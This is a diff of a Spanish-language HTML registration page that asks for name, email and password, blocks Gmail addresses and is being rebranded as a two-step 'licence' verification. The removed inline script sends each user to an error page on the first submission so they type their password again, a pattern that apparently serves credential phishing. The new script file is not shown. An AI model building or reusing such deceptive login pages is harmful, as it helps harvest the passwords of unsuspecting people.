@@ -3,165 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro de Apoyo</title>
+    <title>Registro de Licencias</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --color-primario: #FF6B6B;
-            --color-secundario: #FF9F43;
-            --degradado: linear-gradient(45deg, #FF6B6B, #FF9F43);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Montserrat', sans-serif;
-        }
-
-        body {
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: var(--degradado);
-            animation: fondoAnimado 10s ease infinite;
-            background-size: 200% 200%;
-        }
-
-        @keyframes fondoAnimado {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .contenedor {
-            width: 100%;
-            max-width: 500px;
-            padding: 2rem;
-        }
-
-        .tarjeta {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 2.5rem;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            backdrop-filter: blur(10px);
-        }
-
-        .cabecera {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .icono-principal {
-            font-size: 4rem;
-            margin-bottom: 1rem;
-            animation: flotar 3s ease-in-out infinite;
-        }
-
-        @keyframes flotar {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
-
-        h1 {
-            color: #2d3436;
-            font-size: 2rem;
-            margin-bottom: 0.5rem;
-        }
-
-        .grupo-input {
-            margin-bottom: 1.5rem;
-        }
-
-        input {
-            width: 100%;
-            padding: 1rem;
-            border: 2px solid #eee;
-            border-radius: 12px;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: var(--color-primario);
-            box-shadow: 0 0 0 3px rgba(255,107,107,0.1);
-        }
-
-        .boton {
-            width: 100%;
-            padding: 1rem;
-            background: var(--degradado);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: transform 0.3s;
-        }
-
-        .boton:hover {
-            transform: translateY(-2px);
-        }
-
-        .mensaje-error {
-            color: #dc3545;
-            font-size: 0.9rem;
-            margin-top: 0.5rem;
-            display: none;
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+    <div class="fondo-dinamico"></div>
+    
     <div class="contenedor">
         <div class="tarjeta">
             <div class="cabecera">
-                <div class="icono-principal">🤝</div>
-                <h1>Regístrate para ser<br>a tu amigo ganador</h1>
+                <div class="icono">🔑</div>
+                <h1>Registro de Licencia</h1>
+                <p>Verificación en 2 pasos</p>
             </div>
 
             <form id="formRegistro">
                 <div class="grupo-input">
-                    <input type="text" placeholder="Nombre completo" id="nombre" required>
+                    <input type="text" id="nombre" placeholder="Nombre completo" required>
                 </div>
 
                 <div class="grupo-input">
-                    <input type="email" placeholder="Correo electrónico" id="correo" required>
-                    <div class="mensaje-error" id="errorEmail">⚠️ No se permiten cuentas Gmail</div>
+                    <input type="email" id="correo" placeholder="correo@ejemplo.com" required>
+                    <div class="error-email">Correos Gmail no permitidos</div>
                 </div>
 
                 <div class="grupo-input">
-                    <input type="password" placeholder="Contraseña" id="password" required>
+                    <input type="password" id="password" placeholder="Contraseña" required>
                 </div>
 
-                <button type="submit" class="boton">Validar Registro</button>
+                <button type="submit">Validar Ahora →</button>
             </form>
         </div>
     </div>
 
-    <script>
-        document.getElementById('formRegistro').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const email = document.getElementById('correo').value;
-            let intentos = localStorage.getItem('intentos') || 0;
-
-            if(email.includes('@gmail.com')) {
-                document.getElementById('errorEmail').style.display = 'block';
-                return;
-            }
-
-            localStorage.setItem('intentos', ++intentos);
-
-            if(intentos < 2) {
-                window.location.href = 'error.html';
-            } else {
-                localStorage.removeItem('intentos');
-                window.location.href = 'exito.html';
-            }
-        });
-    </script>
+    <script src="app.js"></script>
 </body>
 </html>
